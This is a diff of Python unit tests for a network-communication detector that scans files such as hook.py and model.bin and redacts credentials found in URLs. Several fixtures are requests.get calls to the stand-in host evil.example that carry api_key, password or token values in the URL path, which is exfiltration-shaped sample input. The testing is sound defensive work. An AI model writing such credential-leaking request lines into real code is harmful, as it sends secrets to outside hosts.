@@ -61,6 +61,31 @@ class TestNetworkCommDetector:
         assert "SECRET_TOKEN" not in serialized
         assert "SECRET_FRAGMENT" not in serialized
 
+    def test_single_quoted_url_with_apostrophe_userinfo_does_not_reexpose_credentials(self) -> None:
+        """An RFC-valid apostrophe in userinfo must not turn a credential into the reported host."""
+        data = b"requests.get('https://SECRET'@example.com/path')"
+
+        findings = NetworkCommDetector().scan(data, "hook.py")
+        serialized = json.dumps(findings, sort_keys=True)
+
+        assert "SECRET" not in serialized
+        assert "https://example.com/path" in serialized
+
+    @pytest.mark.parametrize(
+        "url, secret",
+        [
+            ("https://api_key=HOSTSECRET.example.com/path", "HOSTSECRET"),
+            ("https://AKIAIOSFODNN7EXAMPLE.example.com/path", "AKIAIOSFODNN7EXAMPLE"),
+        ],
+    )
+    def test_detect_urls_redacts_hostname_credentials(self, url: str, secret: str) -> None:
+        """Credential-shaped hostname labels must not survive URL or domain findings."""
+        findings = NetworkCommDetector().scan(url.encode(), "model.bin")
+
+        serialized = json.dumps(findings, sort_keys=True)
+        assert secret.lower() not in serialized.lower()
+        assert "https://<redacted>.example.com/path" in serialized
+
     def test_detect_urls_preserves_port_zero_and_rejects_hostless_netloc(self) -> None:
         """URL redaction should preserve explicit port 0 and avoid hostless netloc output."""
         detector = NetworkCommDetector()
@@ -773,6 +798,30 @@ class TestNetworkCommDetector:
 
         assert len(ipv6_findings) == 2
 
+    @pytest.mark.parametrize(
+        "url, secret",
+        [
+            ("https://evil.example/api_key=12.34.56.78/model.bin", "12.34.56.78"),
+            (
+                "https://evil.example/api_key=2001:0db8:85a3:0000:0000:8a2e:0370:7334/model.bin",
+                "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
+            ),
+            ("https://12.34.56.78@example.com/model.bin", "12.34.56.78"),
+            ("https://12.34.56.78'@example.com/model.bin", "12.34.56.78"),
+        ],
+    )
+    def test_ip_findings_do_not_reexpose_redacted_url_credentials(self, url: str, secret: str) -> None:
+        """IP-shaped URL credentials should disappear from every serialized finding."""
+        findings = NetworkCommDetector().scan(url.encode(), "hook.py")
+
+        assert secret not in json.dumps(findings, sort_keys=True)
+
+    def test_url_host_ip_still_produces_an_ip_finding(self) -> None:
+        """Skipping redacted URL credentials must not hide an actual endpoint IP."""
+        findings = NetworkCommDetector().scan(b"https://12.34.56.78/model.bin", "hook.py")
+
+        assert any(finding["type"] == "ipv4_address" and finding["ip"] == "12.34.56.78" for finding in findings)
+
     def test_detect_domain_names(self) -> None:
         """Test detection of domain names."""
         detector = NetworkCommDetector()
@@ -960,6 +1009,7 @@ class TestNetworkCommDetector:
     @pytest.mark.parametrize(
         "suffix",
         [
+            "SECRETTAIL",
             "+'SECRETTAIL'",
             ".format('SECRETTAIL')",
             "% 'SECRETTAIL'",
@@ -979,6 +1029,17 @@ class TestNetworkCommDetector:
         assert network_finding["snippet"] == "requests.get https://example.com/path"
         assert "SECRETTAIL" not in serialized
 
+    def test_network_function_snippets_preserve_valid_url_apostrophes(self) -> None:
+        """Apostrophes inside a double-quoted URL path are URL data, not source delimiters."""
+        data = b"requests.get(\"https://example.com/rock'n'roll/model.bin\")"
+
+        findings = NetworkCommDetector().scan(data, "hook.py")
+        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
+        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+
+        assert url_finding["url"] == "https://example.com/rock'n'roll/model.bin"
+        assert network_finding["snippet"] == "requests.get https://example.com/rock'n'roll/model.bin"
+
     @pytest.mark.parametrize(
         "key",
         [
@@ -991,6 +1052,8 @@ class TestNetworkCommDetector:
             "refresh_token",
             "credential",
             "x-api-key",
+            "db_password",
+            "service_token",
         ],
     )
     def test_sensitive_url_path_assignments_redact_low_entropy_values(self, key: str) -> None:
@@ -1002,7 +1065,7 @@ class TestNetworkCommDetector:
         url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
         serialized = json.dumps([network_finding, url_finding], sort_keys=True)
 
-        assert f"/{key}=<redacted>/model.bin" in str(network_finding["snippet"])
+        assert "/<redacted>/model.bin" in str(network_finding["snippet"])
         assert "SECRET123" not in serialized
 
     def test_authorization_path_assignment_redacts_full_encoded_payload(self) -> None:
@@ -1012,9 +1075,34 @@ class TestNetworkCommDetector:
         findings = NetworkCommDetector().scan(data, "hook.py")
         serialized = json.dumps(findings, sort_keys=True)
 
-        assert "Authorization=<redacted>" in serialized
+        assert "/<redacted>/model.bin" in serialized
+        assert "Authorization" not in serialized
         assert "Bearer" not in serialized
         assert "SECRET123" not in serialized
+
+    def test_nested_sensitive_url_path_assignments_are_fully_redacted(self) -> None:
+        """Nested assignment syntax must not hide a credential-shaped inner key."""
+        findings = NetworkCommDetector().scan(
+            b'requests.get("https://evil.example/x=api_key=abc/model.bin")',
+            "hook.py",
+        )
+
+        serialized = json.dumps(findings, sort_keys=True)
+        assert "api_key" not in serialized
+        assert "=abc" not in serialized
+        assert "https://evil.example/<redacted>/model.bin" in serialized
+
+    @pytest.mark.parametrize("key", ["api_key", "password", "service_token"])
+    def test_paired_sensitive_url_path_segments_redact_the_following_value(self, key: str) -> None:
+        """Routes that encode credentials as adjacent key/value segments should redact the value."""
+        findings = NetworkCommDetector().scan(
+            f'requests.get("https://evil.example/{key}/letmein/model.bin")'.encode(),
+            "hook.py",
+        )
+
+        serialized = json.dumps(findings, sort_keys=True)
+        assert "letmein" not in serialized
+        assert f"https://evil.example/{key}/<redacted>/model.bin" in serialized
 
     @pytest.mark.parametrize(
         "path",
